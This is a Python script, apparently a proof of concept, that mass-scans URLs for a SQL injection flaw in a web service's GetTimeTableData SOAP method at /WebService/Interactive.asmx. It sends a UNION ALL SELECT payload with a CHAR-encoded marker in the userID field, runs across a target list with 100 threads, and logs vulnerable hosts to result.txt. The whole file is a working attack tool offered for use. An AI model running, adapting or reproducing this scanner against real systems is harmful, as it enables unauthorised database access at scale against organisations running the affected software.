import requests,sys,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """

███╗   ███╗███████╗███████╗██╗  ██╗████████╗███████╗ ██████╗ ██╗     
████╗ ████║██╔════╝╚══███╔╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔═══██╗██║     
██╔████╔██║█████╗    ███╔╝  ╚███╔╝    ██║   ███████╗██║   ██║██║     
██║╚██╔╝██║██╔══╝   ███╔╝   ██╔██╗    ██║   ╚════██║██║▄▄ ██║██║     
██║ ╚═╝ ██║██║     ███████╗██╔╝ ██╗   ██║   ███████║╚██████╔╝███████╗
╚═╝     ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚══▀▀═╝ ╚══════╝
                                                                                                                                       
                                                        version: 1.0
"""
    print(banner)
def main():
    banner()
    parser = argparse.ArgumentParser(description='QLBSQL! ')
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    #判断输入的参数是单个还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        #多线程
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload_url = "/WebService/Interactive.asmx"
    url = target+payload_url
    headers={
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'close',
        'Cookie': 'ASP.NET_SessionId=bwk5l0xu02utzfib4tmsap5t',
        'Upgrade-Insecure-Requests': '1',
        'Priority':'u=1',
        'SOAPAction': 'http://tempuri.org/GetTimeTableData',
        'Content-Type': 'text/xml;charset=UTF-8',
        'Content-Length': '1418'
    }
    data = "\r\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\r\n   <soapenv:Header/>\r\n   <soapenv:Body>\r\n      <tem:GetTimeTableData>\r\n         <!--type: string-->\r\n         <tem:userID>gero et' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(113)+CHAR(118)+CHAR(107)+CHAR(113)+CHAR(74)+CHAR(88)+CHAR(79)+CHAR(115)+CHAR(68)+CHAR(99)+CHAR(75)+CHAR(97)+CHAR(78)+CHAR(86)+CHAR(85)+CHAR(82)+CHAR(87)+CHAR(68)+CHAR(97)+CHAR(71)+CHAR(70)+CHAR(71)+CHAR(80)+CHAR(81)+CHAR(115)+CHAR(88)+CHAR(102)+CHAR(83)+CHAR(114)+CHAR(98)+CHAR(88)+CHAR(116)+CHAR(68)+CHAR(79)+CHAR(90)+CHAR(120)+CHAR(75)+CHAR(74)+CHAR(83)+CHAR(106)+CHAR(85)+CHAR(87)+CHAR(66)+CHAR(113)+CHAR(113)+CHAR(106)+CHAR(113)+CHAR(98)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Hene</tem:userID>\r\n         <!--type: string-->\r\n         <tem:startDate>sonoras imperio</tem:startDate>\r\n      </tem:GetTimeTableData>\r\n   </soapenv:Body>\r\n</soapenv:Envelope>"
    try:
        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=10)
        if res.status_code == 500 and 'qqvkqJXOsDcKaNVURWDaGFGPQsXfSrbXtDOZxKJSjUWBqqjqbq' in res.text :
            print(f"[+]该url存在漏洞{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                        fp.write(target+"\n")
                        return True
        else:
            print(f"[-]该url不存在漏洞{target}")
    except :
        print(f"[*]该url存在问题{target}")
        return False

if __name__ == '__main__':
    main()